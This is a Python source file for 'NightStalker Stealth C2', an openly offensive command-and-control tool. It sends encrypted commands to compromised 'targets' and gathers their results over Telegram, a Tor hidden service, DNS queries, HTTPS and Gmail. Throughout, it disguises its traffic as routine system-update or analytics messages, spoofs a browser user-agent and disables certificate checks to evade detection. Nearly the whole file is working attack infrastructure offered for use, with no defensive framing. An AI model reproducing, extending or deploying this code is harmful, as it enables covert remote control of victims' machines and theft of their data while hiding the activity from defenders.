#!/usr/bin/env python3
"""
NightStalker Stealth C2 - Covert Command & Control
Supports Telegram bot, Tor hidden service, and other stealth channels
"""

import os
import sys
import json
import time
import base64
import hashlib
import threading
import subprocess
import tempfile
import requests
import socket
import ssl
import urllib3
from pathlib import Path
from typing import Dict, List, Optional, Any, Callable
from datetime import datetime, timedelta
import random
import string
import logging

# Disable SSL warnings for stealth operations
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from ..utils.logger import Logger
from ..utils.config import Config
from ..utils.crypto import StealthCrypto


class StealthC2:
    """Stealth Command & Control system with multiple covert channels"""
    
    def __init__(self, config_file: Optional[str] = None):
        self.logger = Logger(__name__)
        self.config = Config(config_file)
        self.crypto = StealthCrypto()
        
        # C2 channels
        self.channels = {}
        self.active_channel = None
        
        # Target management
        self.targets = {}
        self.command_queue = {}
        self.results_cache = {}
        
        # Stealth settings
        self.jitter = 0.1  # Random delay between communications
        self.max_retries = 3
        self.timeout = 30
        
        # Initialize channels
        self._init_channels()
    
    def _init_channels(self):
        """Initialize available C2 channels"""
        self.channels = {
            'telegram': TelegramC2Channel(self.config, self.crypto),
            'tor': TorHiddenServiceChannel(self.config, self.crypto),
            'dns': DNSC2Channel(self.config, self.crypto),
            'https': HTTPSChannel(self.config, self.crypto),
            'gmail': GmailC2Channel(self.config, self.crypto)
        }
    
    def setup_channel(self, channel_type: str, **kwargs) -> bool:
        """Setup a specific C2 channel"""
        if channel_type not in self.channels:
            self.logger.error(f"Unknown channel type: {channel_type}")
            return False
        
        try:
            success = self.channels[channel_type].setup(**kwargs)
            if success:
                self.active_channel = channel_type
                self.logger.success(f"C2 channel '{channel_type}' setup successfully")
                return True
            else:
                self.logger.error(f"Failed to setup C2 channel '{channel_type}'")
                return False
        except Exception as e:
            self.logger.error(f"Error setting up C2 channel: {e}")
            return False
    
    def register_target(self, target_id: str, target_info: Dict) -> bool:
        """Register a new target"""
        try:
            self.targets[target_id] = {
                'info': target_info,
                'registered': datetime.now(),
                'last_seen': datetime.now(),
                'status': 'active',
                'commands_sent': 0,
                'commands_completed': 0
            }
            self.command_queue[target_id] = []
            self.results_cache[target_id] = []
            
            self.logger.success(f"Target '{target_id}' registered successfully")
            return True
        except Exception as e:
            self.logger.error(f"Error registering target: {e}")
            return False
    
    def send_command(self, target_id: str, command: str, timeout: int = 300) -> bool:
        """Send command to target"""
        if target_id not in self.targets:
            self.logger.error(f"Target '{target_id}' not found")
            return False
        
        if not self.active_channel:
            self.logger.error("No active C2 channel")
            return False
        
        try:
            command_id = self._generate_command_id()
            command_data = {
                'id': command_id,
                'command': command,
                'timestamp': datetime.now().isoformat(),
                'timeout': timeout
            }
            
            # Add to command queue
            self.command_queue[target_id].append(command_data)
            self.targets[target_id]['commands_sent'] += 1
            
            # Send via active channel
            success = self.channels[self.active_channel].send_command(target_id, command_data)
            
            if success:
                self.logger.success(f"Command sent to target '{target_id}': {command}")
                return True
            else:
                self.logger.error(f"Failed to send command to target '{target_id}'")
                return False
                
        except Exception as e:
            self.logger.error(f"Error sending command: {e}")
            return False
    
    def get_results(self, target_id: str, command_id: Optional[str] = None) -> List[Dict]:
        """Get command results from target"""
        if target_id not in self.targets:
            return []
        
        try:
            if not self.active_channel:
                return []
            
            # Get results from active channel
            results = self.channels[self.active_channel].get_results(target_id, command_id)
            
            # Update cache
            if results:
                self.results_cache[target_id].extend(results)
                self.targets[target_id]['last_seen'] = datetime.now()
                self.targets[target_id]['commands_completed'] += len(results)
            
            return results
            
        except Exception as e:
            self.logger.error(f"Error getting results: {e}")
            return []
    
    def list_targets(self) -> Dict[str, Dict]:
        """List all registered targets"""
        return self.targets
    
    def get_target_status(self, target_id: str) -> Optional[Dict]:
        """Get detailed status of a target"""
        if target_id not in self.targets:
            return None
        
        target = self.targets[target_id].copy()
        target['pending_commands'] = len(self.command_queue.get(target_id, []))
        target['cached_results'] = len(self.results_cache.get(target_id, []))
        
        return target
    
    def _generate_command_id(self) -> str:
        """Generate unique command ID"""
        timestamp = str(int(time.time()))
        random_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        return f"cmd_{timestamp}_{random_suffix}"
    
    def cleanup(self):
        """Cleanup C2 resources"""
        for channel in self.channels.values():
            try:
                channel.cleanup()
            except:
                pass


class BaseC2Channel:
    """Base class for C2 channels"""
    
    def __init__(self, config: Config, crypto: StealthCrypto):
        self.config = config
        self.crypto = crypto
        self.logger = Logger(self.__class__.__name__)
        self.is_setup = False
    
    def setup(self, **kwargs) -> bool:
        """Setup the channel (to be implemented by subclasses)"""
        raise NotImplementedError
    
    def send_command(self, target_id: str, command_data: Dict) -> bool:
        """Send command via channel (to be implemented by subclasses)"""
        raise NotImplementedError
    
    def get_results(self, target_id: str, command_id: Optional[str] = None) -> List[Dict]:
        """Get results via channel (to be implemented by subclasses)"""
        raise NotImplementedError
    
    def cleanup(self):
        """Cleanup channel resources"""
        pass


class TelegramC2Channel(BaseC2Channel):
    """Telegram bot C2 channel - highly stealthy and easy to setup"""
    
    def __init__(self, config: Config, crypto: StealthCrypto):
        super().__init__(config, crypto)
        self.bot_token = None
        self.chat_id = None
        self.api_url = None
        self.last_update_id = 0
    
    def setup(self, bot_token: str, chat_id: str, **kwargs) -> bool:
        """Setup Telegram bot channel"""
        try:
            self.bot_token = bot_token
            self.chat_id = chat_id
            self.api_url = f"https://api.telegram.org/bot{bot_token}"
            
            # Test bot connection
            response = requests.get(f"{self.api_url}/getMe", timeout=10)
            if response.status_code == 200:
                bot_info = response.json()
                self.logger.success(f"Telegram bot connected: @{bot_info['result']['username']}")
                self.is_setup = True
                return True
            else:
                self.logger.error(f"Failed to connect to Telegram bot: {response.text}")
                return False
                
        except Exception as e:
            self.logger.error(f"Error setting up Telegram channel: {e}")
            return False
    
    def send_command(self, target_id: str, command_data: Dict) -> bool:
        """Send command via Telegram"""
        if not self.is_setup:
            return False
        
        try:
            # Encrypt command data
            encrypted_data = self.crypto.encrypt(json.dumps(command_data))
            encoded_data = base64.b64encode(encrypted_data).decode()
            
            # Create stealth message
            message = self._create_stealth_message(target_id, encoded_data)
            
            # Send via Telegram
            payload = {
                'chat_id': self.chat_id,
                'text': message,
                'parse_mode': 'HTML'
            }
            
            response = requests.post(f"{self.api_url}/sendMessage", json=payload, timeout=10)
            
            if response.status_code == 200:
                self.logger.debug(f"Command sent via Telegram to {target_id}")
                return True
            else:
                self.logger.error(f"Failed to send Telegram message: {response.text}")
                return False
                
        except Exception as e:
            self.logger.error(f"Error sending command via Telegram: {e}")
            return False
    
    def get_results(self, target_id: str, command_id: Optional[str] = None) -> List[Dict]:
        """Get results via Telegram"""
        if not self.is_setup:
            return []
        
        try:
            # Get updates from Telegram
            payload = {
                'offset': self.last_update_id + 1,
                'timeout': 5
            }
            
            response = requests.post(f"{self.api_url}/getUpdates", json=payload, timeout=15)
            
            if response.status_code != 200:
                return []
            
            updates = response.json().get('result', [])
            results = []
            
            for update in updates:
                self.last_update_id = update['update_id']
                
                if 'message' in update and 'text' in update['message']:
                    message_text = update['message']['text']
                    
                    # Check if message contains results
                    if self._is_result_message(message_text, target_id):
                        try:
                            # Extract and decrypt result data
                            result_data = self._extract_result_data(message_text)
                            if result_data:
                                results.append(result_data)
                        except Exception as e:
                            self.logger.error(f"Error processing result message: {e}")
            
            return results
            
        except Exception as e:
            self.logger.error(f"Error getting results via Telegram: {e}")
            return []
    
    def _create_stealth_message(self, target_id: str, encoded_data: str) -> str:
        """Create stealth message that looks like normal chat"""
        stealth_templates = [
            f"📱 <b>System Update</b>\nDevice: {target_id}\nStatus: {encoded_data[:20]}...",
            f"🔧 <b>Maintenance Alert</b>\nTarget: {target_id}\nCode: {encoded_data[:15]}...",
            f"📊 <b>Performance Report</b>\nID: {target_id}\nData: {encoded_data[:25]}...",
            f"⚙️ <b>Configuration</b>\nNode: {target_id}\nHash: {encoded_data[:18]}...",
            f"📈 <b>Analytics</b>\nEndpoint: {target_id}\nMetric: {encoded_data[:22]}..."
        ]
        
        return random.choice(stealth_templates)
    
    def _is_result_message(self, message: str, target_id: str) -> bool:
        """Check if message contains results for target"""
        return target_id in message and any(keyword in message.lower() for keyword in ['result', 'output', 'response', 'data'])
    
    def _extract_result_data(self, message: str) -> Optional[Dict]:
        """Extract result data from message"""
        try:
            # Find encoded data in message
            import re
            match = re.search(r'[A-Za-z0-9+/]{20,}={0,2}', message)
            if match:
                encoded_data = match.group()
                encrypted_data = base64.b64decode(encoded_data)
                decrypted_data = self.crypto.decrypt(encrypted_data)
                return json.loads(decrypted_data)
        except:
            pass
        return None


class TorHiddenServiceChannel(BaseC2Channel):
    """Tor hidden service C2 channel - maximum stealth"""
    
    def __init__(self, config: Config, crypto: StealthCrypto):
        super().__init__(config, crypto)
        self.hidden_service_dir = None
        self.onion_address = None
        self.tor_process = None
        self.server_socket = None
    
    def setup(self, hidden_service_dir: str = None, **kwargs) -> bool:
        """Setup Tor hidden service channel"""
        try:
            if not hidden_service_dir:
                hidden_service_dir = tempfile.mkdtemp(prefix='nightstalker_tor_')
            
            self.hidden_service_dir = hidden_service_dir
            
            # Create hidden service configuration
            self._create_tor_config()
            
            # Start Tor service
            if self._start_tor_service():
                self.is_setup = True
                self.logger.success(f"Tor hidden service setup on: {self.onion_address}")
                return True
            else:
                return False
                
        except Exception as e:
            self.logger.error(f"Error setting up Tor channel: {e}")
            return False
    
    def _create_tor_config(self):
        """Create Tor configuration for hidden service"""
        try:
            # Create torrc file
            torrc_path = os.path.join(self.hidden_service_dir, 'torrc')
            
            torrc_content = f"""
HiddenServiceDir {self.hidden_service_dir}
HiddenServicePort 80 127.0.0.1:8080
HiddenServiceVersion 3
"""
            
            with open(torrc_path, 'w') as f:
                f.write(torrc_content)
            
            # Create hostname file (will be generated by Tor)
            hostname_path = os.path.join(self.hidden_service_dir, 'hostname')
            
        except Exception as e:
            self.logger.error(f"Error creating Tor config: {e}")
            raise
    
    def _start_tor_service(self) -> bool:
        """Start Tor service and get onion address"""
        try:
            # Start Tor process
            torrc_path = os.path.join(self.hidden_service_dir, 'torrc')
            self.tor_process = subprocess.Popen(
                ['tor', '-f', torrc_path],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            # Wait for hidden service to be ready
            hostname_path = os.path.join(self.hidden_service_dir, 'hostname')
            max_wait = 30
            
            for _ in range(max_wait):
                if os.path.exists(hostname_path):
                    with open(hostname_path, 'r') as f:
                        self.onion_address = f.read().strip()
                    return True
                time.sleep(1)
            
            return False
            
        except Exception as e:
            self.logger.error(f"Error starting Tor service: {e}")
            return False
    
    def send_command(self, target_id: str, command_data: Dict) -> bool:
        """Send command via Tor hidden service"""
        if not self.is_setup:
            return False
        
        try:
            # Encrypt command data
            encrypted_data = self.crypto.encrypt(json.dumps(command_data))
            
            # Send via HTTP POST to hidden service
            url = f"http://{self.onion_address}/command"
            payload = {
                'target_id': target_id,
                'data': base64.b64encode(encrypted_data).decode()
            }
            
            # Use requests with Tor proxy
            proxies = {
                'http': 'socks5h://127.0.0.1:9050',
                'https': 'socks5h://127.0.0.1:9050'
            }
            
            response = requests.post(url, json=payload, proxies=proxies, timeout=30)
            
            if response.status_code == 200:
                self.logger.debug(f"Command sent via Tor to {target_id}")
                return True
            else:
                self.logger.error(f"Failed to send command via Tor: {response.status_code}")
                return False
                
        except Exception as e:
            self.logger.error(f"Error sending command via Tor: {e}")
            return False
    
    def get_results(self, target_id: str, command_id: Optional[str] = None) -> List[Dict]:
        """Get results via Tor hidden service"""
        if not self.is_setup:
            return []
        
        try:
            # Get results via HTTP GET from hidden service
            url = f"http://{self.onion_address}/results"
            params = {'target_id': target_id}
            if command_id:
                params['command_id'] = command_id
            
            proxies = {
                'http': 'socks5h://127.0.0.1:9050',
                'https': 'socks5h://127.0.0.1:9050'
            }
            
            response = requests.get(url, params=params, proxies=proxies, timeout=30)
            
            if response.status_code == 200:
                results_data = response.json()
                results = []
                
                for result in results_data.get('results', []):
                    try:
                        encrypted_data = base64.b64decode(result['data'])
                        decrypted_data = self.crypto.decrypt(encrypted_data)
                        results.append(json.loads(decrypted_data))
                    except Exception as e:
                        self.logger.error(f"Error decrypting result: {e}")
                
                return results
            else:
                return []
                
        except Exception as e:
            self.logger.error(f"Error getting results via Tor: {e}")
            return []
    
    def cleanup(self):
        """Cleanup Tor resources"""
        if self.tor_process:
            try:
                self.tor_process.terminate()
                self.tor_process.wait(timeout=5)
            except:
                self.tor_process.kill()


class DNSC2Channel(BaseC2Channel):
    """DNS C2 channel - very stealthy, uses DNS queries"""
    
    def __init__(self, config: Config, crypto: StealthCrypto):
        super().__init__(config, crypto)
        self.domain = None
        self.dns_server = None
    
    def setup(self, domain: str, dns_server: str = "8.8.8.8", **kwargs) -> bool:
        """Setup DNS C2 channel"""
        try:
            self.domain = domain
            self.dns_server = dns_server
            self.is_setup = True
            self.logger.success(f"DNS C2 channel setup with domain: {domain}")
            return True
        except Exception as e:
            self.logger.error(f"Error setting up DNS channel: {e}")
            return False
    
    def send_command(self, target_id: str, command_data: Dict) -> bool:
        """Send command via DNS"""
        if not self.is_setup:
            return False
        
        try:
            # Encode command in DNS query
            encoded_data = self._encode_for_dns(command_data)
            query = f"{encoded_data}.{target_id}.{self.domain}"
            
            # Send DNS query
            import dns.resolver
            resolver = dns.resolver.Resolver()
            resolver.nameservers = [self.dns_server]
            
            resolver.resolve(query, 'A')
            self.logger.debug(f"Command sent via DNS to {target_id}")
            return True
            
        except Exception as e:
            self.logger.error(f"Error sending command via DNS: {e}")
            return False
    
    def get_results(self, target_id: str, command_id: Optional[str] = None) -> List[Dict]:
        """Get results via DNS"""
        if not self.is_setup:
            return []
        
        try:
            # Query for results
            query = f"results.{target_id}.{self.domain}"
            
            import dns.resolver
            resolver = dns.resolver.Resolver()
            resolver.nameservers = [self.dns_server]
            
            answers = resolver.resolve(query, 'TXT')
            
            results = []
            for answer in answers:
                try:
                    result_data = self._decode_from_dns(str(answer))
                    results.append(result_data)
                except Exception as e:
                    self.logger.error(f"Error decoding DNS result: {e}")
            
            return results
            
        except Exception as e:
            self.logger.error(f"Error getting results via DNS: {e}")
            return []
    
    def _encode_for_dns(self, data: Dict) -> str:
        """Encode data for DNS transmission"""
        json_str = json.dumps(data)
        encrypted = self.crypto.encrypt(json_str)
        encoded = base64.b64encode(encrypted).decode()
        # Replace problematic characters
        encoded = encoded.replace('+', '-').replace('/', '_').replace('=', '')
        return encoded[:63]  # DNS label limit
    
    def _decode_from_dns(self, dns_data: str) -> Dict:
        """Decode data from DNS transmission"""
        # Restore base64 padding
        padding = 4 - (len(dns_data) % 4)
        if padding != 4:
            dns_data += '=' * padding
        
        # Restore characters
        dns_data = dns_data.replace('-', '+').replace('_', '/')
        
        encrypted = base64.b64decode(dns_data)
        decrypted = self.crypto.decrypt(encrypted)
        return json.loads(decrypted)


class HTTPSChannel(BaseC2Channel):
    """HTTPS C2 channel - uses legitimate HTTPS traffic"""
    
    def __init__(self, config: Config, crypto: StealthCrypto):
        super().__init__(config, crypto)
        self.server_url = None
        self.api_key = None
    
    def setup(self, server_url: str, api_key: str, **kwargs) -> bool:
        """Setup HTTPS C2 channel"""
        try:
            self.server_url = server_url
            self.api_key = api_key
            self.is_setup = True
            self.logger.success(f"HTTPS C2 channel setup with server: {server_url}")
            return True
        except Exception as e:
            self.logger.error(f"Error setting up HTTPS channel: {e}")
            return False
    
    def send_command(self, target_id: str, command_data: Dict) -> bool:
        """Send command via HTTPS"""
        if not self.is_setup:
            return False
        
        try:
            # Encrypt command data
            encrypted_data = self.crypto.encrypt(json.dumps(command_data))
            
            # Create stealth request
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'application/json',
                'Authorization': f'Bearer {self.api_key}'
            }
            
            payload = {
                'target_id': target_id,
                'data': base64.b64encode(encrypted_data).decode(),
                'timestamp': int(time.time())
            }
            
            response = requests.post(
                f"{self.server_url}/api/command",
                json=payload,
                headers=headers,
                timeout=30,
                verify=False
            )
            
            if response.status_code == 200:
                self.logger.debug(f"Command sent via HTTPS to {target_id}")
                return True
            else:
                self.logger.error(f"Failed to send command via HTTPS: {response.status_code}")
                return False
                
        except Exception as e:
            self.logger.error(f"Error sending command via HTTPS: {e}")
            return False
    
    def get_results(self, target_id: str, command_id: Optional[str] = None) -> List[Dict]:
        """Get results via HTTPS"""
        if not self.is_setup:
            return []
        
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'application/json',
                'Authorization': f'Bearer {self.api_key}'
            }
            
            params = {'target_id': target_id}
            if command_id:
                params['command_id'] = command_id
            
            response = requests.get(
                f"{self.server_url}/api/results",
                params=params,
                headers=headers,
                timeout=30,
                verify=False
            )
            
            if response.status_code == 200:
                results_data = response.json()
                results = []
                
                for result in results_data.get('results', []):
                    try:
                        encrypted_data = base64.b64decode(result['data'])
                        decrypted_data = self.crypto.decrypt(encrypted_data)
                        results.append(json.loads(decrypted_data))
                    except Exception as e:
                        self.logger.error(f"Error decrypting result: {e}")
                
                return results
            else:
                return []
                
        except Exception as e:
            self.logger.error(f"Error getting results via HTTPS: {e}")
            return []


class GmailC2Channel(BaseC2Channel):
    """Gmail C2 channel - uses Gmail API for stealth"""
    
    def __init__(self, config: Config, crypto: StealthCrypto):
        super().__init__(config, crypto)
        self.gmail_service = None
        self.user_id = None
    
    def setup(self, credentials_file: str, user_id: str = "me", **kwargs) -> bool:
        """Setup Gmail C2 channel"""
        try:
            from google.oauth2.credentials import Credentials
            from google_auth_oauthlib.flow import InstalledAppFlow
            from google.auth.transport.requests import Request
            from googleapiclient.discovery import build
            import pickle
            import os.path
            
            SCOPES = ['https://www.googleapis.com/auth/gmail.modify']
            
            creds = None
            token_path = 'token.pickle'
            
            if os.path.exists(token_path):
                with open(token_path, 'rb') as token:
                    creds = pickle.load(token)
            
            if not creds or not creds.valid:
                if creds and creds.expired and creds.refresh_token:
                    creds.refresh(Request())
                else:
                    flow = InstalledAppFlow.from_client_secrets_file(credentials_file, SCOPES)
                    creds = flow.run_local_server(port=0)
                
                with open(token_path, 'wb') as token:
                    pickle.dump(creds, token)
            
            self.gmail_service = build('gmail', 'v1', credentials=creds)
            self.user_id = user_id
            self.is_setup = True
            
            self.logger.success(f"Gmail C2 channel setup for user: {user_id}")
            return True
            
        except Exception as e:
            self.logger.error(f"Error setting up Gmail channel: {e}")
            return False
    
    def send_command(self, target_id: str, command_data: Dict) -> bool:
        """Send command via Gmail"""
        if not self.is_setup:
            return False
        
        try:
            # Encrypt command data
            encrypted_data = self.crypto.encrypt(json.dumps(command_data))
            encoded_data = base64.b64encode(encrypted_data).decode()
            
            # Create email message
            message = self._create_email_message(target_id, encoded_data)
            
            # Send email
            self.gmail_service.users().messages().send(
                userId=self.user_id,
                body=message
            ).execute()
            
            self.logger.debug(f"Command sent via Gmail to {target_id}")
            return True
            
        except Exception as e:
            self.logger.error(f"Error sending command via Gmail: {e}")
            return False
    
    def get_results(self, target_id: str, command_id: Optional[str] = None) -> List[Dict]:
        """Get results via Gmail"""
        if not self.is_setup:
            return []
        
        try:
            # Search for result emails
            query = f'from:{target_id} subject:"System Report"'
            results = self.gmail_service.users().messages().list(
                userId=self.user_id,
                q=query
            ).execute()
            
            messages = results.get('messages', [])
            results_list = []
            
            for message in messages:
                try:
                    msg = self.gmail_service.users().messages().get(
                        userId=self.user_id,
                        id=message['id']
                    ).execute()
                    
                    # Extract result data from email
                    result_data = self._extract_result_from_email(msg)
                    if result_data:
                        results_list.append(result_data)
                        
                except Exception as e:
                    self.logger.error(f"Error processing email: {e}")
            
            return results_list
            
        except Exception as e:
            self.logger.error(f"Error getting results via Gmail: {e}")
            return []
    
    def _create_email_message(self, target_id: str, encoded_data: str) -> Dict:
        """Create email message with command data"""
        import base64
        from email.mime.text import MIMEText
        
        # Create stealth subject and body
        subject = f"System Update - {target_id}"
        body = f"""
Dear System Administrator,

Please review the following system update:

Target ID: {target_id}
Update Hash: {encoded_data[:20]}...
Timestamp: {datetime.now().isoformat()}

Best regards,
System Management
"""
        
        message = MIMEText(body)
        message['to'] = target_id
        message['subject'] = subject
        
        return {'raw': base64.urlsafe_b64encode(message.as_bytes()).decode()}
    
    def _extract_result_from_email(self, email_message: Dict) -> Optional[Dict]:
        """Extract result data from email"""
        try:
            # Extract email body
            if 'payload' in email_message:
                parts = email_message['payload'].get('parts', [])
                for part in parts:
                    if part['mimeType'] == 'text/plain':
                        data = part['body']['data']
                        body = base64.urlsafe_b64decode(data).decode()
                        
                        # Look for encoded data in body
                        import re
                        match = re.search(r'[A-Za-z0-9+/]{20,}={0,2}', body)
                        if match:
                            encoded_data = match.group()
                            encrypted_data = base64.b64decode(encoded_data)
                            decrypted_data = self.crypto.decrypt(encrypted_data)
                            return json.loads(decrypted_data)
        except:
            pass
        return None


def main():
    """CLI entry point for stealth C2"""
    import argparse
    
    parser = argparse.ArgumentParser(description='NightStalker Stealth C2')
    parser.add_argument('--channel', choices=['telegram', 'tor', 'dns', 'https', 'gmail'], 
                       required=True, help='C2 channel type')
    parser.add_argument('--setup', action='store_true', help='Setup C2 channel')
    parser.add_argument('--send', help='Send command to target')
    parser.add_argument('--target', help='Target ID')
    parser.add_argument('--list-targets', action='store_true', help='List targets')
    
    args = parser.parse_args()
    
    c2 = StealthC2()
    
    if args.setup:
        print(f"Setting up {args.channel} C2 channel...")
        # Add setup prompts based on channel type
        if args.channel == 'telegram':
            bot_token = input("Enter Telegram bot token: ")
            chat_id = input("Enter chat ID: ")
            c2.setup_channel('telegram', bot_token=bot_token, chat_id=chat_id)
        elif args.channel == 'tor':
            c2.setup_channel('tor')
        # Add other channel setups...
    
    elif args.send and args.target:
        if not c2.active_channel:
            print("No active C2 channel. Use --setup first.")
            return 1
        
        c2.send_command(args.target, args.send)
    
    elif args.list_targets:
        targets = c2.list_targets()
        for target_id, target_info in targets.items():
            print(f"Target: {target_id}")
            print(f"  Status: {target_info['status']}")
            print(f"  Last seen: {target_info['last_seen']}")
            print(f"  Commands sent: {target_info['commands_sent']}")
            print(f"  Commands completed: {target_info['commands_completed']}")
            print()
    
    else:
        parser.print_help()


if __name__ == "__main__":
    main() 